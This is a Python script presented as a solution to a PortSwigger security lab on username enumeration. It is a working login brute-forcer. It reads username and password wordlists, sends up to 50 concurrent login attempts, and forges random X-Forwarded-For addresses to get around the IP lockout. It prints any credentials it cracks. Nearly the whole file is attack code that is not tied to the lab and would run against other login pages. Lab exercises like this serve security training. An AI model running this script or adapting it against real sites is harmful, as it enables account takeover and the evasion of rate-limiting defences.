from requests import request
from random import randint
from concurrent.futures import ThreadPoolExecutor,as_completed
from sys import argv
from io import FileIO


def get_session(url):
    print('GET /login')
    res=request(url=url,method='GET')
    cookies=""
    for key,value in res.cookies.get_dict().items():
        cookies=cookies+key+"="+value+";"
    return cookies

def readWorldList(wordlist_name):
    try:
        worldlist=FileIO(wordlist_name).read().decode().split('\n')
        while worldlist.count(''):
            worldlist.remove('')
        return worldlist
    except :
        print('[-] Error While reading file')

def login_worker(url,cookies,ip,username,password):
    try:
        print('[!] Trying with IP ['+ip+']'' =>   '+username+':'+password) 
        data='username='+username+'&password='+password
        headers={'Cookie':cookies,'X-Forwarded-For':ip}
    
        res=request(url=url,method='POST',data=data,headers=headers)
        content=res.content.decode()
        if content.count('Invalid username or password.')==0 and content.count('You have made too many incorrect login attempts. Please try again in 30 minute(s).')==0:
            print('Cracked With : {username:'+username+',password:'+password+'}')
            return True
        elif content.count('You have made too many incorrect login attempts. Please try again in 30 minute(s).')==1:
            print('[X] Warning IP['+ip+'] Had Been Blocked... Trying Again With Another IP '  )
            login_worker(url,cookies,generate_random_ip(),username,password)
            return False
        else:
            return False
    except:
        print('[!] Retrying with IP ['+ip+']'' =>   '+username+':'+password) 
        login_worker(url,cookies,ip,username,password)
    
def generate_random_ip():
    return str(randint(0,255))+'.'+str(randint(0,255))+'.'+str(randint(0,255))+'.'+str(randint(0,255))

def bruteforce(url,cookies,username,password_list):
    with ThreadPoolExecutor(max_workers=50) as executor:
        future_to_login={}
        for password in password_list:
            future=executor.submit(login_worker,url+'login',cookies,generate_random_ip(),username,password)
            future_to_login[future]=password
        for future in as_completed(future_to_login):
            try:
                if future.result():
                    executor.shutdown(wait=False)
                    for f in future_to_login.keys():
                        if f != future:
                            f.cancel()
                    return True
            except Exception as exc:
                print(exc)

def pwn(url,username_list,password_list):
    if url[-1]!='/':
        url=url+'/'
    username_list=readWorldList(username_list)
    password_list=readWorldList(password_list)
    cookies=get_session(url+'login')
    for username in username_list:
        if(bruteforce(url,cookies,username,password_list)):
            break

if __name__ == "__main__":
 print("""
    0xCrypt00o Soluation for Portswigger LAB : Username-Enumeration-Via-Different-Responses-Times
        For More Soluation check :
                https://github.com/Crypt00o/Portswigger-Labs/
    """)
 if len(argv)==4:
     pwn(argv[1],argv[2],argv[3])
 else:
     print("call it with : ./pwn-auth-username-enumeration-via-different-responses-times.py <url> <path to username wordlist> <path to password wordlist> ")
